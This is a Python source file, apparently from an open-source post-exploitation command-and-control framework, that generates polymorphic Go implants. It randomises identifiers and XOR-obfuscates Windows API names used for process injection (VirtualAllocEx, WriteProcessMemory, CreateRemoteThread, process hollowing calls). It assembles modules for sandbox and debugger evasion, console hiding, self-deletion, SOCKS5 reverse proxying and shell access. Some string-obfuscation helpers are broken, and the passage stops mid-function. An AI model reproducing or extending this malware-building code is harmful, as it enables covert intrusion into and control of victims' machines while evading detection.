"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import uuid
import random
import string
import json
import base64
import hashlib
import time
import os
from datetime import datetime
import subprocess
import tempfile
import shutil
from cryptography.fernet import Fernet

class PolymorphicEngine:
    def __init__(self):
        self.var_mapping = {}
        self.func_mapping = {}

    def generate_random_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        styles = [
            lambda: ''.join(random.choices(string.ascii_lowercase, k=length)),
            lambda: '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length-1)),
            lambda: ''.join(random.choice([c.upper(), c.lower()]) for c in random.choices(string.ascii_letters, k=length)),
        ]

        name = random.choice(styles)()
        return prefix + name if prefix else name

    def generate_go_field_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        name = ''.join(random.choices(string.ascii_lowercase, k=length))
        capitalized_name = name[0].upper() + name[1:]
        return prefix + capitalized_name if prefix else capitalized_name

    def obfuscate_string(self, s):
        technique = random.randint(0, 4)

        if technique == 0:
            encoded = base64.b64encode(s.encode()).decode()
            return f"__import__('base64').b64decode('{encoded}').decode()"
        elif technique == 1:
            hex_str = s.encode().hex()
            return f"bytes.fromhex('{hex_str}').decode()"
        elif technique == 2:
            codes = [str(ord(c)) for c in s]
            return f"chr({codes[0]}) + chr({codes[1]}) + chr({codes[2:]})" if len(codes) >= 3 else f"chr({','.join(codes)})"
        elif technique == 3:
            reversed_s = s[::-1]
            return f"'{s[:mid]}' + '{s[mid:]}'"
        else:
            mid = len(s) // 2
            return f"'{s[:mid]}' + '{s[mid:]}'"

    def generate_dead_code(self):
        var_name = self.generate_random_name()
        value = random.choice(['None', '0', '""', '[]', '{}', 'False', 'True'])
        comment = random.choice(['Placeholder', 'Reserved', 'Internal', 'Config', 'Cache', 'State'])

        dead_code_templates = [
            f"_{var_name} = {value}  # {comment}",
            f"_{var_name} = lambda: {value}  # {comment}",
            f"# {comment}\n        _{var_name} = {value}",
        ]

        return random.choice(dead_code_templates)


class TrinityPayloadGenerator:
    def __init__(self, config, db):
        self.config = config
        self.db = db

    def _generate_fernet_key(self):
        return Fernet.generate_key().decode()

    def generate_payload(self, listener_id, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True, kill_date='2025-12-31T23:59:59Z', working_hours=None, redirector_host='0.0.0.0', redirector_port=80, failover_urls=None, profile_headers=None, shellcode_format=None):
        if failover_urls is None:
            failover_urls = []
        if profile_headers is None:
            profile_headers = {'User-Agent': 'Trinity C2 Agent'}

        print(f"[DEBUG] Generating POLYMORPHIC Trinity payload for listener_id: {listener_id}")

        listener = self.db.get_listener(listener_id)
        if not listener:
            listener = self.db.get_listener_by_name(listener_id)
            if not listener:
                raise ValueError(f"Listener with ID or name '{listener_id}' not found.")
        print(f"[DEBUG] Listener profile_name: {listener.get('profile_name', 'default')}")

        profile = self.db.get_profile_by_name(listener['profile_name'])
        if not profile:
            profile = self.db.get_profile_by_name('default')
            if not profile:
                raise ValueError(f"Profile '{listener['profile_name']}' not found and no default profile available.")

        profile_config = profile.get('config', {})

        if isinstance(profile_config, str):
            try:
                profile_config = json.loads(profile_config)
            except json.JSONDecodeError:
                print(f"[WARNING] Profile config is invalid JSON, using empty config")
                profile_config = {}
        elif not isinstance(profile_config, dict):
            print(f"[WARNING] Profile config is not a dict, using empty config")
            profile_config = {}

        # Override with passed parameters
        profile_config['kill_date'] = kill_date
        profile_config['working_hours'] = working_hours
        profile_config['redirector'] = {
            'redirector_host': redirector_host,
            'redirector_port': redirector_port
        }
        profile_config['failover_urls'] = failover_urls
        if profile_headers:
            profile_config['headers'] = profile_headers

        protocol = profile_config.get('protocol', 'http')
        host = listener['host']
        if host == '0.0.0.0':
            host = self.config.get('server.host', '127.0.0.1')
        port = listener['port']
        c2_server_url = f"{protocol}://{host}:{port}"

        agent_id = str(uuid.uuid4())
        secret_key = self.db._generate_secret_key() if hasattr(self.db, '_generate_secret_key') else self._generate_fernet_key()

        try:
            self.db.execute('''
                INSERT INTO agents (id, ip_address, hostname, os_info, user, listener_id, first_seen, last_seen, status, secret_key)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (agent_id, '0.0.0.0', 'pending', 'pending', 'pending', listener_id, datetime.now(), datetime.now(), 'pending', secret_key))
            print(f"[+] Agent pre-registered in database with ID: {agent_id}")

            max_retries = 5
            for attempt in range(max_retries):
                verification = self.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
                if verification and verification['secret_key'] == secret_key:
                    print(f"[+] Verified agent pre-registration for ID: {agent_id}")
                    break
                else:
                    print(f"[DEBUG] Agent not yet visible in database (attempt {attempt + 1}/{max_retries}), retrying...")
                    time.sleep(0.1)
            else:
                print(f"[ERROR] Failed to verify agent pre-registration after {max_retries} attempts")
                raise Exception(f"Agent pre-registration verification failed for ID: {agent_id}")

        except Exception as e:
            print(f"[ERROR] Failed to pre-register agent: {str(e)}")
            raise

        # Extract kill_date and working_hours from profile_config
        kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
        working_hours = profile_config.get('working_hours', {
            "start_hour": 9,
            "end_hour": 17,
            "timezone": "UTC",
            "days": [1, 2, 3, 4, 5]  # Monday to Friday
        })

        return self._generate_go_agent(
            agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_execute_pe=include_execute_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox, shellcode_format=shellcode_format
        )

    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True, shellcode_format=None):
        if failover_urls is None:
            failover_urls = []
        if profile_headers is None:
            profile_headers = {'User-Agent': 'Trinity C2 Agent'}
        import subprocess
        import os
        import tempfile
        import shutil
        from datetime import datetime
        import random

        # Create a polymorphic engine instance for Trinity agent
        poly = PolymorphicEngine()

        # Generate random names for struct types and fields
        agent_struct_name = poly.generate_random_name('Agent')
        task_struct_name = poly.generate_random_name('Task')
        task_result_struct_name = poly.generate_random_name('TaskResult')
        api_response_struct_name = poly.generate_random_name('ApiResponse')

        # Generate random names for struct fields
        agent_c2_url_field = poly.generate_go_field_name('C2')
        agent_id_field = poly.generate_go_field_name('ID')
        agent_headers_field = poly.generate_go_field_name('Headers')
        agent_heartbeat_interval_field = poly.generate_go_field_name('HbInterval')
        agent_jitter_field = poly.generate_go_field_name('Jitter')
        agent_register_uri_field = poly.generate_go_field_name('RegisterURI')
        agent_tasks_uri_field = poly.generate_go_field_name('TasksURI')
        agent_results_uri_field = poly.generate_go_field_name('ResultsURI')
        agent_interactive_uri_field = poly.generate_go_field_name('InteractiveURI')
        agent_interactive_status_uri_field = poly.generate_go_field_name('InteractiveStatusURI')
        agent_running_field = poly.generate_go_field_name('Running')
        agent_interactive_mode_field = poly.generate_go_field_name('InteractiveMode')
        agent_hostname_field = poly.generate_go_field_name('Hostname')
        agent_username_field = poly.generate_go_field_name('Username')
        agent_osinfo_field = poly.generate_go_field_name('OSInfo')
        agent_secret_key_field = poly.generate_go_field_name('SecretKey')
        agent_current_interactive_task_field = poly.generate_go_field_name('CurrentInteractiveTask')
        agent_disable_sandbox_field = poly.generate_go_field_name('DisableSandbox')
        agent_kill_date_field = poly.generate_go_field_name('KillDate')
        agent_working_hours_field = poly.generate_go_field_name('WorkingHours')

        # Generate random names for redirector fields
        agent_redirector_host_field = poly.generate_go_field_name('RedirectorHost')
        agent_redirector_port_field = poly.generate_go_field_name('RedirectorPort')
        agent_use_redirector_field = poly.generate_go_field_name('UseRedirector')

        # Generate random names for task struct fields
        task_id_field = poly.generate_go_field_name('ID')
        task_command_field = poly.generate_go_field_name('Cmd')

        # Generate random names for task result struct fields
        task_result_task_id_field = poly.generate_go_field_name('TaskID')
        task_result_result_field = poly.generate_go_field_name('Result')

        # Generate random names for function names
        agent_encrypt_data_func = poly.generate_random_name('encryptData')
        agent_decrypt_data_func = poly.generate_random_name('decryptData')
        agent_send_func = poly.generate_random_name('sendRequest')
        agent_register_func = poly.generate_random_name('register')
        agent_get_tasks_func = poly.generate_random_name('getTasks')
        agent_check_interactive_status_func = poly.generate_random_name('checkInteractiveStatus')
        agent_get_interactive_command_func = poly.generate_random_name('getInteractiveCommand')
        agent_submit_interactive_result_func = poly.generate_random_name('submitInteractiveResult')
        agent_submit_task_result_func = poly.generate_random_name('submitTaskResult')
        agent_execute_func = poly.generate_random_name('execute')
        agent_handle_module_func = poly.generate_random_name('handleModule')
        agent_handle_upload_func = poly.generate_random_name('handleUpload')
        agent_handle_download_func = poly.generate_random_name('handleDownload')
        agent_handle_tty_shell_func = poly.generate_random_name('handleTTYShell')
        agent_handle_sleep_func = poly.generate_random_name('handleSleep')

        # Conditionally generate function names based on included features
        agent_handle_bof_func = poly.generate_random_name('handleBOF') if include_bof else 'handleBOF_stub'
        agent_handle_dotnet_assembly_func = poly.generate_random_name('handleDotNetAssembly') if include_assembly else 'handleDotNetAssembly_stub'
        agent_get_process_id_func = poly.generate_random_name('getProcessId') if (include_shellcode or include_pe) else 'getProcessId_stub'
        agent_inject_shellcode_func = poly.generate_random_name('injectShellcode') if include_shellcode else 'injectShellcode_stub'
        agent_inject_pe_func = poly.generate_random_name('injectPE') if include_pe else 'injectPE_stub'
        agent_execute_pe_func = poly.generate_random_name('executePE') if (include_pe and include_execute_pe) else 'executePE_stub'

        # Generate random names for reverse proxy fields (only if included)
        agent_reverse_proxy_active_field = poly.generate_go_field_name('ReverseProxyActive') if include_reverse_proxy else 'ReverseProxyActive_stub'
        agent_reverse_proxy_stop_chan_field = poly.generate_go_field_name('ReverseProxyStopChan') if include_reverse_proxy else 'ReverseProxyStopChan_stub'
        agent_reverse_proxy_lock_field = poly.generate_go_field_name('ReverseProxyLock') if include_reverse_proxy else 'ReverseProxyLock_stub'

        # Generate random names for reverse proxy function names (only if included)
        agent_start_reverse_proxy_func = poly.generate_random_name('startReverseProxy') if include_reverse_proxy else 'startReverseProxy_stub'
        agent_stop_reverse_proxy_func = poly.generate_random_name('stopReverseProxy') if include_reverse_proxy else 'stopReverseProxy_stub'
        agent_handle_socks5_func = poly.generate_random_name('handleSOCKS5') if include_reverse_proxy else 'handleSOCKS5_stub'

        # Generate random names for sandbox functions (only if included)
        agent_check_sandbox_func = poly.generate_random_name('checkSandbox') if include_sandbox else 'checkSandbox_stub'
        agent_check_processes_for_sandbox_func = poly.generate_random_name('checkProcessesForSandbox') if include_sandbox else 'checkProcessesForSandbox_stub'
        agent_check_windows_processes_for_sandbox_func = poly.generate_random_name('checkWindowsProcessesForSandbox') if include_sandbox else 'checkWindowsProcessesForSandbox_stub'
        agent_check_network_tools_func = poly.generate_random_name('checkNetworkTools') if include_sandbox else 'checkNetworkTools_stub'
        agent_check_debuggers_func = poly.generate_random_name('checkDebuggers') if include_sandbox else 'checkDebuggers_stub'
        agent_check_processes_for_debuggers_func = poly.generate_random_name('checkProcessesForDebuggers') if include_sandbox else 'checkProcessesForDebuggers_stub'
        agent_check_windows_processes_for_debuggers_func = poly.generate_random_name('checkWindowsProcessesForDebuggers') if include_sandbox else 'checkWindowsProcessesForDebuggers_stub'
        agent_check_windows_debugger_func = poly.generate_random_name('checkWindowsDebugger') if include_sandbox else 'checkWindowsDebugger_stub'

        agent_process_command_func = poly.generate_random_name('processCommand')
        agent_run_func = poly.generate_random_name('run')
        agent_stop_func = poly.generate_random_name('stop')
        agent_self_delete_func = poly.generate_random_name('selfDelete')
        agent_hide_console_func = poly.generate_random_name('hideConsole')
        agent_check_working_hours_func = poly.generate_random_name('checkWorkingHours')
        agent_check_kill_date_func = poly.generate_random_name('checkKillDate')

        # Generate random names for failover functions
        agent_try_failover_func = poly.generate_random_name('tryFailover')
        agent_increment_fail_count_func = poly.generate_random_name('incrementFailCount')
        agent_reset_fail_count_func = poly.generate_random_name('resetFailCount')

        # Generate random names for new failover fields
        agent_failover_urls_field = poly.generate_go_field_name('FailoverURLs')
        agent_use_failover_field = poly.generate_go_field_name('UseFailover')
        agent_current_c2_url_field = poly.generate_go_field_name('CurrentC2URL')
        agent_current_fail_count_field = poly.generate_go_field_name('CurrentFailCount')
        agent_max_fail_count_field = poly.generate_go_field_name('MaxFailCount')
        agent_last_connection_attempt_field = poly.generate_go_field_name('LastConnectionAttempt')
        agent_in_failover_attempt_field = poly.generate_go_field_name('InFailoverAttempt')

        # Build the Trinity agent by combining core and selected feature modules
        go_code_parts = []

        # Build the package declaration with conditional imports
        core_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'core')

        # Start with the package declaration
        package_file = os.path.join(core_dir, 'package_declaration.go')
        if os.path.exists(package_file):
            with open(package_file, 'r') as f:
                full_content = f.read()

                # Conditionally include imports based on features
                import_lines = []
                import_lines.append("package main")
                import_lines.append("")
                import_lines.append("import (")

                # Core imports (always included)
                core_imports = [
                    '"bytes"',
                    '"context"',
                    '"crypto/tls"',
                    '"encoding/base64"',
                    '"encoding/binary"',
                    '"encoding/json"',
                    '"fmt"',
                    '"io"',
                    '"io/ioutil"',
                    '"math/rand"',
                    '"net"',
                    '"net/http"',
                    '"net/url"',
                    '"os"',
                    '"os/exec"',
                    '"runtime"',
                    '"strconv"',
                    '"strings"',
                    '"sync"',
                    '"syscall"',
                    '"time"',
                    '"unsafe"',
                    '"github.com/fernet/fernet-go"'
                ]

                for imp in core_imports:
                    import_lines.append(f"\t{imp}")

                # Conditionally add feature-specific imports
                if include_bof:
                    import_lines.append('\t"github.com/praetorian-inc/goffloader/src/coff"')
                    import_lines.append('\t"github.com/praetorian-inc/goffloader/src/lighthouse"')

                if include_assembly:
                    import_lines.append('\t"github.com/Ne0nd0g/go-clr"')

                if include_execute_pe:
                    import_lines.append('\t"github.com/praetorian-inc/goffloader/src/pe"')

                import_lines.append(")")
                import_lines.append("")  # Empty line after imports

                # Add the import block
                go_code_parts.append('\n'.join(import_lines))

        # Then add other core files without package declarations or imports
        for filename in os.listdir(core_dir):
            if filename.endswith('.go') and filename != 'package_declaration.go':
                with open(os.path.join(core_dir, filename), 'r') as f:
                    content = f.read()
                    # Remove any package declaration and import blocks from other files
                    lines = content.split('\n')
                    filtered_lines = []
                    in_package = False
                    in_imports = False
                    in_import_block = False
                    skip_line = False

                    for line in lines:
                        stripped = line.strip()

                        # Skip package declaration
                        if stripped.startswith('package '):
                            continue

                        # Skip import statements (both single and block)
                        if stripped.startswith('import '):
                            if '(' in stripped:  # import block start
                                in_import_block = True
                                continue
                            else:  # single import
                                continue

                        # Handle import block
                        if in_import_block:
                            if stripped == ')':  # end of import block
                                in_import_block = False
                                continue
                            else:  # inside import block
                                continue

                        # Add the line if not in an import block
                        filtered_lines.append(line)

                    go_code_parts.append('\n'.join(filtered_lines))

        # Conditionally add feature modules
        if include_bof:
            bof_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'bof')
            for filename in os.listdir(bof_dir):
                if filename.endswith('.go'):
                    with open(os.path.join(bof_dir, filename), 'r') as f:
                        content = f.read()
                        # Remove any package declaration and import blocks from feature modules
                        lines = content.split('\n')
                        filtered_lines = []
                        in_import_block = False

                        for line in lines:
                            stripped = line.strip()

                            # Skip package declaration
                            if stripped.startswith('package '):
                                continue

                            # Skip import statements
                            if stripped.startswith('import '):
                                if '(' in stripped:  # import block start
                                    in_import_block = True
                                continue

                            # Handle import block
                            if in_import_block:
                                if stripped == ')':  # end of import block
                                    in_import_block = False
                                continue

                            filtered_lines.append(line)

                        go_code_parts.append('\n'.join(filtered_lines))

        if include_assembly:
            assembly_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'assembly')
            for filename in os.listdir(assembly_dir):
                if filename.endswith('.go'):
                    with open(os.path.join(assembly_dir, filename), 'r') as f:
                        content = f.read()
                        # Remove any package declaration and import blocks from feature modules
                        lines = content.split('\n')
                        filtered_lines = []
                        in_import_block = False

                        for line in lines:
                            stripped = line.strip()

                            # Skip package declaration
                            if stripped.startswith('package '):
                                continue

                            # Skip import statements
                            if stripped.startswith('import '):
                                if '(' in stripped:  # import block start
                                    in_import_block = True
                                continue

                            # Handle import block
                            if in_import_block:
                                if stripped == ')':  # end of import block
                                    in_import_block = False
                                continue

                            filtered_lines.append(line)

                        go_code_parts.append('\n'.join(filtered_lines))

        if include_shellcode or include_pe:  # Both need the same Windows structures
            shellcode_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'shellcode')
            for filename in os.listdir(shellcode_dir):
                if filename.endswith('.go'):
                    with open(os.path.join(shellcode_dir, filename), 'r') as f:
                        content = f.read()
                        # Remove any package declaration and import blocks from feature modules
                        lines = content.split('\n')
                        filtered_lines = []
                        in_import_block = False

                        for line in lines:
                            stripped = line.strip()

                            # Skip package declaration
                            if stripped.startswith('package '):
                                continue

                            # Skip import statements
                            if stripped.startswith('import '):
                                if '(' in stripped:  # import block start
                                    in_import_block = True
                                continue

                            # Handle import block
                            if in_import_block:
                                if stripped == ')':  # end of import block
                                    in_import_block = False
                                continue

                            filtered_lines.append(line)

                        go_code_parts.append('\n'.join(filtered_lines))

        if include_pe:
            pe_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'pe')
            for filename in os.listdir(pe_dir):
                if filename.endswith('.go'):
                    with open(os.path.join(pe_dir, filename), 'r') as f:
                        content = f.read()
                        # Remove any package declaration and import blocks from feature modules
                        lines = content.split('\n')
                        filtered_lines = []
                        in_import_block = False

                        for line in lines:
                            stripped = line.strip()

                            # Skip package declaration
                            if stripped.startswith('package '):
                                continue

                            # Skip import statements
                            if stripped.startswith('import '):
                                if '(' in stripped:  # import block start
                                    in_import_block = True
                                continue

                            # Handle import block
                            if in_import_block:
                                if stripped == ')':  # end of import block
                                    in_import_block = False
                                continue

                            filtered_lines.append(line)

                        go_code_parts.append('\n'.join(filtered_lines))

            # Also include execute_pe module if PE and execute_pe are enabled
            if include_execute_pe:
                execute_pe_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'execute_pe')
                if os.path.exists(execute_pe_dir):
                    for filename in os.listdir(execute_pe_dir):
                        if filename.endswith('.go'):
                            with open(os.path.join(execute_pe_dir, filename), 'r') as f:
                                content = f.read()
                                # Remove any package declaration and import blocks from feature modules
                                lines = content.split('\n')
                                filtered_lines = []
                                in_import_block = False

                                for line in lines:
                                    stripped = line.strip()

                                    # Skip package declaration
                                    if stripped.startswith('package '):
                                        continue

                                    # Skip import statements
                                    if stripped.startswith('import '):
                                        if '(' in stripped:  # import block start
                                            in_import_block = True
                                        continue

                                    # Handle import block
                                    if in_import_block:
                                        if stripped == ')':  # end of import block
                                            in_import_block = False
                                        continue

                                    filtered_lines.append(line)

                                go_code_parts.append('\n'.join(filtered_lines))

        if include_reverse_proxy:
            reverse_proxy_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'reverse_proxy')
            for filename in os.listdir(reverse_proxy_dir):
                if filename.endswith('.go'):
                    with open(os.path.join(reverse_proxy_dir, filename), 'r') as f:
                        content = f.read()
                        # Remove any package declaration and import blocks from feature modules
                        lines = content.split('\n')
                        filtered_lines = []
                        in_import_block = False

                        for line in lines:
                            stripped = line.strip()

                            # Skip package declaration
                            if stripped.startswith('package '):
                                continue

                            # Skip import statements
                            if stripped.startswith('import '):
                                if '(' in stripped:  # import block start
                                    in_import_block = True
                                continue

                            # Handle import block
                            if in_import_block:
                                if stripped == ')':  # end of import block
                                    in_import_block = False
                                continue

                            filtered_lines.append(line)

                        go_code_parts.append('\n'.join(filtered_lines))

        if include_sandbox:
            sandbox_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'sandbox')
            for filename in os.listdir(sandbox_dir):
                if filename.endswith('.go'):
                    with open(os.path.join(sandbox_dir, filename), 'r') as f:
                        content = f.read()
                        # Remove any package declaration and import blocks from feature modules
                        lines = content.split('\n')
                        filtered_lines = []
                        in_import_block = False

                        for line in lines:
                            stripped = line.strip()

                            # Skip package declaration
                            if stripped.startswith('package '):
                                continue

                            # Skip import statements
                            if stripped.startswith('import '):
                                if '(' in stripped:  # import block start
                                    in_import_block = True
                                continue

                            # Handle import block
                            if in_import_block:
                                if stripped == ')':  # end of import block
                                    in_import_block = False
                                continue

                            filtered_lines.append(line)

                        go_code_parts.append('\n'.join(filtered_lines))

        go_code = '\n'.join(go_code_parts)

        # Apply polymorphic transformations to the combined code
        if obfuscate:
            # Find and replace the obfuscation key in the template
            go_code = go_code.replace('obfuscationKey = byte(0x42)', f'obfuscationKey = byte({random.randint(1, 255)})')

            # Also make the obfuscated byte arrays random to make each agent unique
            # This means each agent will have different obfuscated byte sequences
            import re

            # Find all the obfuscated byte arrays and replace them with randomly generated ones
            # that will still decrypt to the same original strings
            def randomize_obfuscated_bytes(go_code_template, original_string, var_name):
                # Generate a random key for this specific string
                random_key = random.randint(1, 255)

                # Create obfuscated bytes using the random key
                obfuscated_bytes = []
                for char in original_string:
                    obfuscated_bytes.append(ord(char) ^ random_key)

                # Format as Go byte array
                byte_array_str = ', '.join([f'0x{b:02x}' for b in obfuscated_bytes])

                # Replace the obfuscated byte array in the template
                pattern = var_name + r' = \[\]byte\{[^\}]+\} // "' + original_string + r'"'
                replacement = f'{var_name} = []byte{{{byte_array_str}}} // "{original_string}"'
                return re.sub(pattern, replacement, go_code_template)

            # Randomize the obfuscated DLL and API names if they exist in the code
            if include_shellcode or include_pe:  # These features include the obfuscated strings
                go_code = randomize_obfuscated_bytes(go_code, "kernel32.dll", "obfuscatedKernel32DLL")
                go_code = randomize_obfuscated_bytes(go_code, "ntdll.dll", "obfuscatedNtdllDLL")
                go_code = randomize_obfuscated_bytes(go_code, "user32.dll", "obfuscatedUser32DLL")
                go_code = randomize_obfuscated_bytes(go_code, "OpenProcess", "obfuscatedOpenProcess")
                go_code = randomize_obfuscated_bytes(go_code, "VirtualAllocEx", "obfuscatedVirtualAllocEx")
                go_code = randomize_obfuscated_bytes(go_code, "WriteProcessMemory", "obfuscatedWriteProcessMemory")
                go_code = randomize_obfuscated_bytes(go_code, "CreateRemoteThread", "obfuscatedCreateRemoteThread")
                go_code = randomize_obfuscated_bytes(go_code, "VirtualProtectEx", "obfuscatedVirtualProtectEx")
                go_code = randomize_obfuscated_bytes(go_code, "CreateToolhelp32Snapshot", "obfuscatedCreateToolhelp32Snapshot")
                go_code = randomize_obfuscated_bytes(go_code, "Process32FirstW", "obfuscatedProcess32First")
                go_code = randomize_obfuscated_bytes(go_code, "Process32NextW", "obfuscatedProcess32Next")
                go_code = randomize_obfuscated_bytes(go_code, "CreateProcessW", "obfuscatedCreateProcess")
                go_code = randomize_obfuscated_bytes(go_code, "ResumeThread", "obfuscatedResumeThread")
                go_code = randomize_obfuscated_bytes(go_code, "SuspendThread", "obfuscatedSuspendThread")
                go_code = randomize_obfuscated_bytes(go_code, "GetThreadContext", "obfuscatedGetThreadContext")
                go_code = randomize_obfuscated_bytes(go_code, "SetThreadContext", "obfuscatedSetThreadContext")
                go_code = randomize_obfuscated_bytes(go_code, "ReadProcessMemory", "obfuscatedReadProcessMemory")
                go_code = randomize_obfuscated_bytes(go_code, "NtUnmapViewOfSection", "obfuscatedNtUnmapViewOfSection")
                go_code = randomize_obfuscated_bytes(go_code, "GetConsoleWindow", "obfuscatedGetConsoleWindow")
                go_code = randomize_obfuscated_bytes(go_code, "ShowWindow", "obfuscatedShowWindow")

        # Replace all placeholders with randomly generated names
        go_code = go_code.replace('{AGENT_STRUCT_NAME}', agent_struct_name)
        go_code = go_code.replace('{TASK_STRUCT_NAME}', task_struct_name)
        go_code = go_code.replace('{TASK_RESULT_STRUCT_NAME}', task_result_struct_name)
        go_code = go_code.replace('{API_RESPONSE_STRUCT_NAME}', api_response_struct_name)
        go_code = go_code.replace('{AGENT_C2_URL_FIELD}', agent_c2_url_field)
        go_code = go_code.replace('{AGENT_ID_FIELD}', agent_id_field)
        go_code = go_code.replace('{AGENT_HEADERS_FIELD}', agent_headers_field)
        go_code = go_code.replace('{AGENT_HEARTBEAT_INTERVAL_FIELD}', agent_heartbeat_interval_field)
        go_code = go_code.replace('{AGENT_JITTER_FIELD}', agent_jitter_field)
        go_code = go_code.replace('{AGENT_REGISTER_URI_FIELD}', agent_register_uri_field)
        go_code = go_code.replace('{AGENT_TASKS_URI_FIELD}', agent_tasks_uri_field)
        go_code = go_code.replace('{AGENT_RESULTS_URI_FIELD}', agent_results_uri_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_URI_FIELD}', agent_interactive_uri_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_STATUS_URI_FIELD}', agent_interactive_status_uri_field)
        go_code = go_code.replace('{AGENT_RUNNING_FIELD}', agent_running_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_MODE_FIELD}', agent_interactive_mode_field)
        go_code = go_code.replace('{AGENT_HOSTNAME_FIELD}', agent_hostname_field)
        go_code = go_code.replace('{AGENT_USERNAME_FIELD}', agent_username_field)
        go_code = go_code.replace('{AGENT_OSINFO_FIELD}', agent_osinfo_field)
        go_code = go_code.replace('{AGENT_SECRET_KEY_FIELD}', agent_secret_key_field)
        go_code = go_code.replace('{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}', agent_current_interactive_task_field)
        go_code = go_code.replace('{AGENT_DISABLE_SANDBOX_FIELD}', agent_disable_sandbox_field)
        go_code = go_code.replace('{AGENT_KILL_DATE_FIELD}', agent_kill_date_field)
        go_code = go_code.replace('{AGENT_WORKING_HOURS_FIELD}', agent_working_hours_field)
        go_code = go_code.replace('{AGENT_REDIRECTOR_HOST_FIELD}', agent_redirector_host_field)
        go_code = go_code.replace('{AGENT_REDIRECTOR_PORT_FIELD}', agent_redirector_port_field)
        go_code = go_code.replace('{AGENT_USE_REDIRECTOR_FIELD}', agent_use_redirector_field)
        go_code = go_code.replace('{TASK_ID_FIELD}', task_id_field)
        go_code = go_code.replace('{TASK_COMMAND_FIELD}', task_command_field)
        go_code = go_code.replace('{TASK_RESULT_TASK_ID_FIELD}', task_result_task_id_field)
        go_code = go_code.replace('{TASK_RESULT_RESULT_FIELD}', task_result_result_field)
        go_code = go_code.replace('{AGENT_ENCRYPT_DATA_FUNC}', agent_encrypt_data_func)
        go_code = go_code.replace('{AGENT_DECRYPT_DATA_FUNC}', agent_decrypt_data_func)
        go_code = go_code.replace('{AGENT_SEND_FUNC}', agent_send_func)
        go_code = go_code.replace('{AGENT_REGISTER_FUNC}', agent_register_func)
        go_code = go_code.replace('{AGENT_GET_TASKS_FUNC}', agent_get_tasks_func)
        go_code = go_code.replace('{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}', agent_check_interactive_status_func)
        go_code = go_code.replace('{AGENT_GET_INTERACTIVE_COMMAND_FUNC}', agent_get_interactive_command_func)
        go_code = go_code.replace('{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}', agent_submit_interactive_result_func)
        go_code = go_code.replace('{AGENT_SUBMIT_TASK_RESULT_FUNC}', agent_submit_task_result_func)
        go_code = go_code.replace('{AGENT_EXECUTE_FUNC}', agent_execute_func)
        go_code = go_code.replace('{AGENT_HANDLE_MODULE_FUNC}', agent_handle_module_func)
        go_code = go_code.replace('{AGENT_HANDLE_UPLOAD_FUNC}', agent_handle_upload_func)
        go_code = go_code.replace('{AGENT_HANDLE_DOWNLOAD_FUNC}', agent_handle_download_func)
        go_code = go_code.replace('{AGENT_HANDLE_TTY_SHELL_FUNC}', agent_handle_tty_shell_func)
        go_code = go_code.replace('{AGENT_HANDLE_SLEEP_FUNC}', agent_handle_sleep_func)
        go_code = go_code.replace('{AGENT_HANDLE_BOF_FUNC}', agent_handle_bof_func)
        go_code = go_code.replace('{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}', agent_handle_dotnet_assembly_func)
        go_code = go_code.replace('{AGENT_PROCESS_COMMAND_FUNC}', agent_process_command_func)
        go_code = go_code.replace('{AGENT_RUN_FUNC}', agent_run_func)
        go_code = go_code.replace('{AGENT_STOP_FUNC}', agent_stop_func)
        go_code = go_code.replace('{AGENT_CHECK_SANDBOX_FUNC}', agent_check_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}', agent_check_processes_for_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}', agent_check_windows_processes_for_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_NETWORK_TOOLS_FUNC}', agent_check_network_tools_func)
        go_code = go_code.replace('{AGENT_CHECK_DEBUGGERS_FUNC}', agent_check_debuggers_func)
